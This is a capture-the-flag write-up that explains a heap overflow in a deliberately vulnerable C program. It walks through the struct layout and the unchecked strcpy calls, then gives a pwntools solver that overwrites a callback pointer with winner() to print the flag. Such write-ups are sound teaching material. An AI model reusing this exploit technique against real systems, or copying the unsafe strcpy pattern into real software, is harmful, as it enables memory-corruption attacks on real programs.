## Source code
``` c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <time.h>

struct internet {
    int priority;
    char *name;
    void (*callback)();
};

void winner() {
    FILE *fp;
    char flag[256];

    fp = fopen("flag.txt", "r");
    if (fp == NULL) {
        perror("Error opening flag.txt");
        exit(1);
    }

    if (fgets(flag, sizeof(flag), fp) != NULL) {
        printf("FLAG: %s\n", flag);
    } else {
        printf("Error reading flag\n");
    }

    fclose(fp);
}

int main(int argc, char **argv) {
    struct internet *i1, *i2, *i3;
    printf("Enter two names separated by space:\n");
    fflush(stdout);   
    if (argc != 3) {
        printf("Usage: ./vuln <name1> <name2>\n", argv[0]);
        fflush(stdout);  
        return 1;
    }

i1 = malloc(sizeof(struct internet));
i1->priority = 1;
i1->name = malloc(8);
i1->callback = NULL;

i2 = malloc(sizeof(struct internet));
i2->priority = 2;
i2->name = malloc(8);
i2->callback = NULL;

strcpy(i1->name, argv[1]);  
strcpy(i2->name, argv[2]); 

if (i1->callback) i1->callback();
if (i2->callback) i2->callback();

    printf("No winners this time, try again!\n");
```

From the full source code above, not every part is  important for exploitation. Some parts only handle normal program setup, such as reading the flag and printing output.  
  
The parts that matter most are the structure layout, the heap allocations, and the unsafe `strcpy()` calls that make heap overflow possible.  
  
---  
  
> [!note]- Section 1 — Struct Layout  
> ```c  
> struct internet {  
> int priority;  
> char *name;  
> void (*callback)();  
> };  
> ```  
>  
> Since this is a **32-bit** binary, each pointer is **4 bytes** wide.  
>  
> So the struct layout becomes:  
>  
> - `int priority` → 4 bytes  
> - `char *name` → 4 bytes  
> - `void (*callback)()` → 4 bytes  
>  
> Total size:  
>  
> ```text  
> 4 + 4 + 4 = 12 bytes  
> ```  
>  
> So `sizeof(struct internet)` is **12 bytes** on this binary.  
>  
> This matters because each `malloc(sizeof(struct internet))` will allocate a small heap chunk that stores these three fields next to each other.  
  
> [!note]- Section 2 — Heap Allocation Layout  
> ```c  
> i1 = malloc(sizeof(struct internet));  
> i1->priority = 1;  
> i1->name = malloc(8);  
> i1->callback = NULL;  
>  
> i2 = malloc(sizeof(struct internet));  
> i2->priority = 2;  
> i2->name = malloc(8);  
> i2->callback = NULL;  
> ```  
>  
> This is the most important part to map out.  
>  
> The program allocates memory in this order:  
>  
> 1. `i1` struct  
> 2. `i1->name` buffer  
> 3. `i2` struct  
> 4. `i2->name` buffer  
>  
> So the heap layout is expected to look roughly like this:  
>  
> ```text  
> [ i1 struct ][ i1->name ][ i2 struct ][ i2->name ]  
> ```  
>  
> Because these allocations happen one after another, they will usually be placed **adjacent on the heap**.  
>  
> That adjacency is what makes the bug exploitable: overflowing one chunk can corrupt the metadata or fields of the next allocated object.  
>  
> In particular, overflowing `i1->name` can let us overwrite fields inside `i2`, including:  
>  
> - `i2->priority`  
> - `i2->name`  
> - `i2->callback`

> [!note]- Section 3 — Vulnerability: Heap Overflow via `strcpy`  
> ```c  
> strcpy(i1->name, argv[1]);  
> strcpy(i2->name, argv[2]);  
> ```  
>  
> The vulnerability comes from `strcpy()`.  
>  
> Unlike safer functions such as `fgets()` or `strncpy()`, `strcpy()` does **not** check how much data is being copied. It will continue copying until it reaches a null byte.  
>  
> But here, both name buffers are only:  
>  
> ```c  
> i1->name = malloc(8);  
> i2->name = malloc(8);  
> ```  
>  
> So each buffer can only safely hold **8 bytes**.  
>  
> If we pass more than 8 bytes into:  
>  
> ```c  
> strcpy(i1->name, argv[1]);  
> ```  
>  
> then the copy will overflow past `i1->name` and continue writing into the next heap chunks.  
>  
> Since the allocations are placed next to each other, this becomes a classic **heap overflow** primitive.

> [!note]- Section 4 — Why Overwriting `i2->name` Needs a Writable Address  
> A very important detail is that the program performs **two** `strcpy()` calls:  
>  
> ```c  
> strcpy(i1->name, argv[1]);  
> strcpy(i2->name, argv[2]);  
> ```  
>  
> Suppose we use the first `strcpy()` overflow from `i1->name` to corrupt fields inside `i2`.  
>  
> One of the fields we may overwrite is:  
>  
> ```c  
> i2->name  
> ```  
>  
> But that creates a problem.  
>  
> Right after the overflow, the program still executes:  
>  
> ```c  
> strcpy(i2->name, argv[2]);  
> ```  
>  
> That means whatever address we place into `i2->name` must be:  
>  
> - **writable**  
> - safe to receive a small string write  
> - not something that crashes immediately when written to  
>  
> If `i2->name` gets overwritten with an invalid or non-writable address, then the second `strcpy()` will crash before execution ever reaches:  
>  
> ```c  
> if (i2->callback) i2->callback();  
> ```  
>  
> So we do not just need to control `i2->callback` — we also need to make sure `i2->name` points somewhere harmless and writable.

> [!note]- Section 5 — Why `.bss` Is a Good Target
> A common solution is to overwrite `i2->name` with an address inside **`.bss`**.
>
> The `.bss` section is typically used for:
>
> - global uninitialized variables  
> - writable program data  
>
> Even if this specific source code does not explicitly define globals in `.bss`, the section still exists and is writable.
>
> The key point is not just that `.bss` is writable, but also **when** it is used.
>
> After:
>
> ```c
> strcpy(i2->name, argv[2]);
> ```
>
> the program immediately does:
>
> ```c
> if (i2->callback) i2->callback();
> ```
>
> There is **no code in between that depends on `.bss`**.
>
> So even though `.bss` can be important in general, in this challenge:
>
> - the second `strcpy()` only performs a small write  
> - nothing reads or relies on `.bss` before the callback is triggered  
>
> This means writing into `.bss` will not break the program flow.
>
> That is why `.bss` becomes a safe and convenient target for `i2->name`, allowing the exploit to proceed and successfully redirect execution to `winner()`.


``` python
from pwn import *

binary = "./vuln"
host = "foggy-cliff.picoctf.net"
port = 61615
elf = ELF(binary, checksec=False)

winner = elf.symbols["winner"]
bss = elf.bss()

log.info(f"winner = {winner:#x}")
log.info(f".bss   = {bss:#x}")

payload1 = flat(
    b"A" * 0x10,
    b"B" * 0x4,
    p32(bss),
    p32(winner),
)

payload2 = b"SAFE"

io = remote(host, port)
io.sendline(payload1 + b" " + payload2)
print(io.recvall(timeout=2).decode(errors="replace"))
```

> [!note]- Solver Explanation
> ```python
> payload1 = flat(
>     b"A" * 0x10,
>     b"B" * 0x4,
>     p32(bss),
>     p32(winner),
> )
> ```
>
> The first argument is copied into:
>
> ```c
> strcpy(i1->name, argv[1]);
> ```
>
> Since `i1->name` only has **8 bytes**, anything longer than that will overflow into the next heap chunk.
>
> To understand the payload, we can map the heap layout like this:
>
> ```text
> [ i1->name chunk ][ i2 struct ]
>                  [ priority ][ name ][ callback ]
> ```
>
> Breakdown:
>
> - `b"A" * 0x10`  
>   This fills:
>   - **8 bytes** of `i1->name`
>   - **8 bytes** of the next chunk header
>
> After that, the write reaches the fields inside `i2`.
>
> - `b"B" * 0x4`  
>   This overwrites:
>
> ```c
> int priority;
> ```
>
> inside `i2`
>
> - `p32(bss)`  
>   This overwrites:
>
> ```c
> char *name;
> ```
>
> inside `i2`, so when the second `strcpy()` runs, it writes into `.bss`
>
> - `p32(winner)`  
>   This overwrites:
>
> ```c
> void (*callback)();
> ```
>
> inside `i2`, replacing it with the address of `winner()`
>
> So the overwrite path is:
>
> ```text
> 8 bytes   -> fill i1->name
> 8 bytes   -> pass the next chunk header
> 4 bytes   -> overwrite i2->priority
> 4 bytes   -> overwrite i2->name with .bss
> 4 bytes   -> overwrite i2->callback with winner
> ```
>
> Which is why the payload is arranged exactly in that order.
>
> Then the program executes:
>
> ```c
> strcpy(i2->name, argv[2]);
> ```
>
> Since `i2->name` now points to `.bss`, this write succeeds safely.
>
> Finally:
>
> ```c
> if (i2->callback) i2->callback();
> ```
>
> and because `i2->callback` now contains `winner`, execution is redirected to `winner()`, which prints the flag.
